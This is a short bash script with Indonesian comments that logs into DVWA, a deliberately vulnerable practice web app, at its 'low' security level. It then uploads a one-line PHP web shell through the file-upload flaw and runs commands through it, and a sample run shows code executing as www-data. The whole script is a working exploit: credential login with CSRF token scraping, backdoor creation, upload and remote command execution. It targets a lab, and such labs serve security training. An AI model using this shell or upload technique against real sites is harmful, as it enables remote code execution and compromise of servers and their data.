#!/usr/bin/env bash
# Simple login and auto File Upload DVWA (level:low)
# By Veri Darmawan

# root@cans:~# chmod +x c
# root@cans:~# ./c
# [!] Sukses Login!
# [?] Nama WebShell : cans.php
# [+] Upload WebShell ...
# [!] Lokasi WebShell : http://localhost/DVWA/hackable/uploads/cans.php
# [?] Test Shell Command : id
# [=] uid=33(www-data) gid=33(www-data) groups=33(www-data) 

host="localhost"
username="admin"
password="password"

# mendapatkan csrf token dan generate cookie.txt
token=$(curl -c cookie.txt -s http://${host}/DVWA/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)

# mendapatkan PHPSESSID / session id dari cookie.txt
session=$(grep PHPSESSID cookie.txt | awk -F' ' '{print $7}')

# Masuk dengan membawa session id dan token dengan POST data username dan password
login=$(curl -s -L -b "PHPSESSID=${session};security=low" -d "username=${username}&password=${password}&Login=Login&user_token=${token}" http://${host}/DVWA/login.php)

# Pengecekan Login berhasil / tidak , jika ada kata Home maka berhasil login
if [[ $login =~ 'Home' ]];then

	echo "[!] Sukses Login !"

	#Membuat simple backdoor
	read -p "[?] Nama WebShell : " backdoor
	echo "[+] Upload Webshell ..."

	# shell memakai backtick atau sama dengan shell_exec
	echo "<?=\`\$_REQUEST[0]\`;" > ${backdoor}

	# Mencoba Upload backdoor
	upload=$(curl -s -b "PHPSESSID=${session};security=low" -F "MAX_FILE_SIZE=100000" -F "uploaded=@${backdoor};filename=${backdoor}" -F "Upload=Upload" http://${host}/DVWA/vulnerabilities/upload/index.php)

	echo "[!] Lokasi WebShell : http://localhost/DVWA/hackable/uploads/${backdoor}"
	read -p "[?] Test Shell Command : " command

	# Test Command Shell
	shell=$(curl -s http://${host}/DVWA/hackable/uploads/${backdoor} -d "0=${command}")
	echo "[=] $shell"

else
	echo "[!] Gagal Login !"
fi
